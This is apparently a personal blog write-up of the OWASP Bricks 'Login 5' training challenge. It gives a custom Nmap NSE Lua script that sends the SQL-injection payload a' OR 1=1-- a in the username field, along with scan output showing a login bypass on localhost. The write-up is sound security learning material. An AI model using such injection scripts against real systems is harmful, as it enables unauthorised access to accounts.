---
date: '2024-12-03T16:23:41+08:00'
title: 'Bricks Login 5'
tags:
    - OWASP-Bricks
    - NSE
---

## Challenge Information

- [OWASP Bricks](https://sechow.com/bricks/)
- Docker version: [here](https://hub.docker.com/r/gjuniioor/owasp-bricks)


> This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by [masta ghimau](https://www.youtube.com/@mastaghimau) during [MCC 2023](https://cybercamp.my/mcc2023-the-journey-begins/).

## Challenge Solution

Login level 5 is just a simple SQL injection which will convert password into md5 hash. We could easily overcome it by injecting in username field.

```lua
local http = require "http"
local shortport = require "shortport"

portrule = shortport.http

action = function(host,port)
  local resp,final,query
  r={}
  r['username']="a' OR 1=1-- a"
  r['passwd']="test"
  r['submit']="Submit"
  resp = http.post(host,port,"/login-5/index.php",nil,nil,r)


  final = string.match(resp.body, '<p>.*alert%-box.->(.-)<a.*</p>')
  query = string.match(resp.body, ".*SQL Query(.*)<a.*</div>")

  return {payload = r ,SQLQuery = query , result = final}
end
```

This code is built based on `http-title.nse`.

```bash
nmap -p 80 --script=chall5.nse 127.0.0.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 20:51 +08
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00015s latency).

PORT   STATE SERVICE
80/tcp open  http
| chall1:
|   result: Succesfully logged in.
|   SQLQuery: : SELECT * FROM users WHERE name='a' OR 1=1-- a' and password='098f6bcd4621d373cade4e832627b4f6'
|   payload:
|     submit: Submit
|     username: a' OR 1=1-- a
|_    passwd: test

Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
```

## Things I learned from the challenge

- Writing custom NSE script

